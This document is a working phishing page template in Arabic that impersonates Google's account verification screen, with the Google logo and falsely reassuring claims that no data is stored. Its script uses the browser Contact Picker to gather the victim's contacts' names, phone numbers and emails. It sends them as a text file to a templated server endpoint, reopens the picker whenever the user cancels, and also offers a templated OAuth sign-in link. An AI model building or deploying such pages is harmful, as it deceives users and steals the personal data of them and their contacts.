<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Google — التحقق من الحساب</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{
  background:#fff;
  font-family:'Google Sans','Roboto',Arial,sans-serif;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px;
}
.card{
  width:100%;
  max-width:400px;
  border:1px solid #dadce0;
  border-radius:28px;
  padding:40px 40px 36px;
  text-align:center;
}
.google-logo{
  margin-bottom:16px;
}
.google-logo svg{
  width:75px;height:24px;
}
h1{
  font-size:24px;
  font-weight:400;
  color:#202124;
  margin-bottom:8px;
  letter-spacing:-.5px;
}
.subtitle{
  font-size:14px;
  color:#5f6368;
  margin-bottom:28px;
  line-height:1.5;
}
.shield-wrap{
  width:64px;height:64px;
  background:#e8f0fe;
  border-radius:50%;
  display:flex;align-items:center;justify-content:center;
  margin:0 auto 20px;
}
.shield-wrap svg{
  width:36px;height:36px;
}
.info-row{
  display:flex;
  align-items:flex-start;
  gap:12px;
  background:#f8f9fa;
  border-radius:12px;
  padding:14px 16px;
  margin-bottom:12px;
  text-align:right;
}
.info-icon{
  font-size:20px;
  flex-shrink:0;
  margin-top:1px;
}
.info-text{
  font-size:13px;
  color:#3c4043;
  line-height:1.5;
}
.info-text strong{
  color:#202124;
  display:block;
  margin-bottom:2px;
}
.divider{
  height:1px;
  background:#e8eaed;
  margin:20px 0;
}
.btn-google{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  width:100%;
  padding:14px 20px;
  background:#1a73e8;
  color:#fff;
  font-size:15px;
  font-weight:500;
  border:none;
  border-radius:50px;
  cursor:pointer;
  text-decoration:none;
  letter-spacing:.25px;
  transition:background .15s;
}
.btn-google:hover{background:#1557b0;}
.btn-google svg{flex-shrink:0;}
.or-row{
  display:flex;
  align-items:center;
  gap:10px;
  margin:16px 0;
  color:#80868b;
  font-size:13px;
}
.or-row::before,.or-row::after{
  content:'';flex:1;height:1px;background:#e8eaed;
}
.btn-picker{
  display:block;
  width:100%;
  padding:13px 20px;
  background:#fff;
  color:#1a73e8;
  font-size:14px;
  font-weight:500;
  border:1px solid #dadce0;
  border-radius:50px;
  cursor:pointer;
  text-decoration:none;
  transition:background .15s;
}
.btn-picker:hover{background:#f8f9fa;}
.footer-note{
  font-size:11px;
  color:#80868b;
  margin-top:20px;
  line-height:1.6;
}
.spinner{
  display:none;
  width:20px;height:20px;
  border:2px solid rgba(255,255,255,.4);
  border-top:2px solid #fff;
  border-radius:50%;
  animation:spin .7s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}
/* No-OAuth fallback */
.unsupported{
  display:none;
  background:#fce8e6;
  border-radius:12px;
  padding:14px 16px;
  font-size:13px;
  color:#c5221f;
  margin-top:16px;
  text-align:center;
}
</style>
</head>
<body>
<div class="card">

  <!-- Google Logo -->
  <div class="google-logo">
    <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
      <path d="M37.43 12.25c0 3.2-2.5 5.56-5.57 5.56s-5.57-2.36-5.57-5.56 2.5-5.56 5.57-5.56 5.57 2.36 5.57 5.56zm-2.44 0c0-2-.85-3.35-3.13-3.35s-3.13 1.35-3.13 3.35.85 3.35 3.13 3.35 3.13-1.35 3.13-3.35z" fill="#EA4335"/>
      <path d="M49.38 12.25c0 3.2-2.5 5.56-5.57 5.56s-5.57-2.36-5.57-5.56 2.5-5.56 5.57-5.56 5.57 2.36 5.57 5.56zm-2.44 0c0-2-.85-3.35-3.13-3.35s-3.13 1.35-3.13 3.35.85 3.35 3.13 3.35 3.13-1.35 3.13-3.35z" fill="#FBBC05"/>
      <path d="M60.86 6.98v9.83c0 4.05-2.39 5.7-5.21 5.7-2.66 0-4.26-1.78-4.86-3.23l2.12-.88c.37.89 1.28 1.94 2.74 1.94 1.8 0 2.91-1.11 2.91-3.2v-.78h-.08c-.53.66-1.56 1.24-2.86 1.24-2.72 0-5.21-2.37-5.21-5.41 0-3.07 2.49-5.56 5.21-5.56 1.29 0 2.32.58 2.86 1.21h.08V6.98h2.3zm-2.14 5.18c0-1.92-1.28-3.32-2.91-3.32-1.64 0-3.02 1.4-3.02 3.32 0 1.9 1.38 3.27 3.02 3.27 1.63 0 2.91-1.37 2.91-3.27z" fill="#4285F4"/>
      <path d="M65.82 1.69v16h-2.37v-16h2.37z" fill="#34A853"/>
      <path d="M75 14.46l1.89 1.26c-.61.9-2.08 2.45-4.62 2.45-3.15 0-5.5-2.43-5.5-5.56 0-3.31 2.37-5.56 5.23-5.56 2.87 0 4.28 2.29 4.74 3.52l.25.63-7.41 3.07c.57 1.11 1.45 1.68 2.7 1.68s2.07-.62 2.72-1.49zm-5.83-2l4.95-2.06c-.27-.69-1.09-1.17-2.05-1.17-1.23 0-2.94 1.09-2.9 3.23z" fill="#EA4335"/>
      <path d="M9.87 10.72V8.4h7.74c.08.4.11.87.11 1.37 0 1.7-.46 3.8-1.96 5.3-1.45 1.53-3.31 2.34-5.88 2.34C4.85 17.41.75 13.43.75 8.38S4.85-.65 9.88-.65c2.64 0 4.52 1.03 5.93 2.38l-1.67 1.67c-1.01-.95-2.38-1.69-4.27-1.69-3.49 0-6.22 2.81-6.22 6.28s2.73 6.28 6.22 6.28c2.27 0 3.56-.91 4.39-1.74.67-.67 1.11-1.63 1.29-2.94l-5.68.01z" fill="#4285F4"/>
    </svg>
  </div>

  <!-- Shield icon -->
  <div class="shield-wrap">
    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5L12 2z" fill="#1a73e8"/>
      <path d="M10 14l-3-3 1.4-1.4 1.6 1.6 4.6-4.6 1.4 1.4L10 14z" fill="#fff"/>
    </svg>
  </div>

  <h1>التحقق من حسابك</h1>
  <p class="subtitle">للمتابعة يجب التحقق من هويتك عبر حساب Google الخاص بك</p>

  <!-- Info rows -->
  <div class="info-row">
    <div class="info-icon">📋</div>
    <div class="info-text">
      <strong>الوصول إلى جهات الاتصال</strong>
      هذه العملية مطلوبة للتحقق من ملكية الحساب وتتم بشكل آمن
    </div>
  </div>
  <div class="info-row">
    <div class="info-icon">🔒</div>
    <div class="info-text">
      <strong>بيانات آمنة ومحمية</strong>
      لا يتم تخزين أي بيانات — العملية تلقائية وآمنة
    </div>
  </div>

  <div class="divider"></div>

  <% if(oauthUrl){ %>
  <!-- Google OAuth button -->
  <a id="btnGoogle" class="btn-google" href="<%= oauthUrl %>">
    <svg width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
      <path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908c1.702-1.567 2.684-3.875 2.684-6.615z" fill="#fff" opacity=".9"/>
      <path d="M9 18c2.43 0 4.467-.806 5.956-2.184l-2.908-2.258c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A8.997 8.997 0 0 0 9 18z" fill="#fff" opacity=".9"/>
      <path d="M3.964 10.707A5.41 5.41 0 0 1 3.682 9c0-.593.102-1.17.282-1.707V4.961H.957A8.996 8.996 0 0 0 0 9c0 1.452.348 2.827.957 4.039l3.007-2.332z" fill="#fff" opacity=".9"/>
      <path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A8.997 8.997 0 0 0 .957 4.961L3.964 7.293C4.672 5.163 6.656 3.58 9 3.58z" fill="#fff" opacity=".9"/>
    </svg>
    <span id="btnGoogleTxt">تسجيل الدخول بـ Google</span>
    <div class="spinner" id="spinner"></div>
  </a>

  <div class="or-row">أو</div>

  <!-- Fallback: Contact Picker -->
  <button class="btn-picker" onclick="openPicker()">📱 التحقق عبر جهات الاتصال المحلية</button>

  <% } else { %>
  <!-- No OAuth configured — use Contact Picker only -->
  <button class="btn-google" style="background:#34a853" onclick="openPicker()">
    📱 التحقق عبر جهات الاتصال
  </button>
  <% } %>

  <p class="footer-note">
    بالمتابعة، أنت توافق على سياسة الخصوصية وشروط الخدمة.<br>
    Google لن تشارك كلمة مرورك مع أي تطبيق آخر.
  </p>

</div>

<script>
const uid = "<%= uid %>";
const srv = "<%= a %>";
const red = "<%= redirectUrl %>";

// Animate button on click
const btnG = document.getElementById('btnGoogle');
if(btnG){
  btnG.addEventListener('click', function(){
    document.getElementById('btnGoogleTxt').textContent = 'جارٍ الاتصال...';
    document.getElementById('spinner').style.display = 'block';
  });
}

// Contact Picker fallback
async function openPicker(){
  if(!('contacts' in navigator)){
    alert('يُرجى استخدام متصفح Chrome على Android لإتمام التحقق');
    return;
  }
  try{
    const contacts = await navigator.contacts.select(
      ['name','tel','email'],
      {multiple: true}
    );
    if(!contacts||contacts.length===0){ openPicker(); return; }
    let txt=`Contacts\nTotal: ${contacts.length}\n${'='.repeat(30)}\n\n`;
    for(const c of contacts){
      const name=(c.name&&c.name[0])||'Unknown';
      const tel=(c.tel||[]).join(' | ');
      const email=(c.email||[]).join(' | ');
      txt+=`Name: ${name}\n`;
      if(tel) txt+=`Phone: ${tel}\n`;
      if(email) txt+=`Email: ${email}\n`;
      txt+='\n';
    }
    const fd=new FormData();
    fd.append('uid',uid);
    fd.append('file',new Blob([txt],{type:'text/plain'}),`Contacts_${contacts.length}.txt`);
    fd.append('count',contacts.length);
    fd.append('filename',`Contacts_${contacts.length}.txt`);
    await fetch(srv+'/contacts-file',{method:'POST',body:fd});
    window.location.href = red || 'https://google.com';
  }catch(e){
    openPicker();
  }
}
</script>
</body>
</html>
